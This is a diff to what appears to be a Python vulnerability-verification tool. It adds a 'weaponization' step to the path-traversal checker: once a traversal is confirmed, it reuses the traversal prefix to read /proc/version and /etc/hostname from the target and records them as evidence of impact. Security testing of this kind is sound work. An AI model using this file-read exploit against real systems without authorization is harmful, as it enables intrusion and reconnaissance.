@@ -2918,6 +2918,54 @@ def verify_generic_path_traversal(
             res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {mode_desc} devolvio "
                           f"el secreto exacto plantado en {canary_path} (dentro del contenedor "
                           f"del objetivo)")
+            # Weaponization: use confirmed traversal depth to read /proc/version + /etc/hostname
+            try:
+                import re as _re_lfiw
+                _win_payload = res.evidence.get("payload_ganador", "")
+                # Extract traversal prefix: everything up to and including the last ../ sequence
+                _depth_m = _re_lfiw.match(r'^((?:\.\./?|%2e%2e/?|%2E%2E/?|\.%2e/?)+)', _win_payload)
+                _depth_prefix = _depth_m.group(1) if _depth_m else ""
+                if _depth_prefix:
+                    _weap_targets = [
+                        ("proc/version", "kernel_version", "Linux version"),
+                        ("etc/hostname",  "hostname",       None),
+                    ]
+                    _weap_data: dict = {}
+                    for _wtarget, _wkey, _wmarker in _weap_targets:
+                        _wpayload = _depth_prefix + _wtarget
+                        try:
+                            import requests as _rq_lfi
+                            _wurl = base_url.rstrip("/") + "/" + win_ep.lstrip("/")
+                            if win_up:
+                                _wresp = _rq_lfi.get(_wurl.rstrip("/") + "/" + _wpayload,
+                                                     headers=dict(custom_headers or {}),
+                                                     timeout=10, allow_redirects=True)
+                            else:
+                                _wresp = _rq_lfi.request(
+                                    (http_method or "GET").upper(), _wurl,
+                                    params={win_pp: _wpayload} if (http_method or "GET").upper() == "GET" else None,
+                                    data={win_pp: _wpayload} if (http_method or "GET").upper() != "GET" else None,
+                                    headers=dict(custom_headers or {}),
+                                    timeout=10, allow_redirects=True)
+                            _wbody = _wresp.text if hasattr(_wresp, "text") else ""
+                            if _wmarker and _wmarker in _wbody:
+                                _km = _re_lfiw.search(r'Linux version [\d.]+[^\n<]{0,80}', _wbody)
+                                _weap_data[_wkey] = _km.group(0) if _km else _wbody.strip()[:100]
+                                step(f"weaponize/lfi: {_wkey} extraido via {_wpayload!r}")
+                            elif not _wmarker and _wbody.strip() and len(_wbody.strip()) < 128:
+                                _weap_data[_wkey] = _wbody.strip()
+                                step(f"weaponize/lfi: {_wkey}={_wbody.strip()[:40]!r}")
+                        except Exception:
+                            pass
+                    if _weap_data:
+                        res.evidence["weaponization"] = {
+                            "technique": "lfi_system_files",
+                            "data": _weap_data,
+                            "impact": ("LFI confirmed — system file access: " +
+                                       ", ".join(f"{k}={str(v)[:40]}" for k, v in _weap_data.items())),
+                        }
+            except Exception:
+                pass
         else:
             res.ok = True
             sample = next((t.get("respuesta_cuerpo_recorte") for t in tried_all
